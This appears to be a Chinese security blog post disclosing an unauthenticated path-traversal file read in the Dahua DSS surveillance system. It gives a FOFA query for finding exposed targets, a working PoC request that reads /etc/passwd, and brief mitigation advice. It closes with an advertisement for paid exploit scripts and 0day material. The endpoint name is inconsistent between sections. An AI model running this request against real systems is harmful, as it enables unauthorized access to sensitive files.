#  大华DSS数字监控系统 attachment_downloadAtt.action 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-12-15 00:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
大华DSS数字监控系统是一个在通用安防视频监控系统基础上设计开发的系统，专为各类企业和组织提供高效、稳定且全面的视频监控解决方案，旨在提升安全防护能力，优化运营管理。支持高清视频流处理，确保图像清晰度，提高监控质量。内置多种智能分析算法，如人脸识别、行为分析、异常检测等，提高预警效率。支持移动终端访问，用户可以随时随地查看监控画面。采用加密技术，保护数据安全，防止非法入侵。典型组网结构包括前端设备（摄像头）、后端服务器、存储设备、网络设备以及客户端软件。系统基于模块化设计，易于扩展和维护。总体层次结构通常包括基层监控节点、区域中心、总中心等多级架构。同时，系统支持多级中心互联，实现远程监控和管理。  
  
0x03  
  
漏洞威胁  
  
大华DSS数字监控系统  attachment_downloadByUrlAtt.action接口存在任意文件读取漏洞，未经身份验证的远程攻击者 可以利用此漏洞获取系统内部敏感文件信息，使系统处于极不安全的状态。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
app="dahua-DSS"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icEOda8h20ic5b1N7OkS5aVTJgA0dhxzJDl9ab46CD3ib00zqVyvq9Ynic7A/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icEUiclibMWibwasYYUX43rwVO5PU7CNnuSCibskBO74GXtr1yAhVcOicrYickg/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icEPia0UNTQUAzKR5LVx8AeLktibYw1kyPCEYrcEXvDyLsKuIibmQnnlUkTw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
目前已提供解决方案，请关注厂商主页更新：https://www.dahuatech.com/  
  
临时修复方案：  
  
通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
如非必要，禁止公网访问该系统。  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icExBHjV5d6xcpXkpXpPvbDTn9krh7jUbGPAJx5pdgnH9w5zVkU9D7EZQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icEVCHshh3GUn88nRqNdLcU1fyH2Vb9zIm8Vw4qPGFZGmNmtibPcjqVABw/640?wx_fmt=gif&from=appmsg "")  
  
  
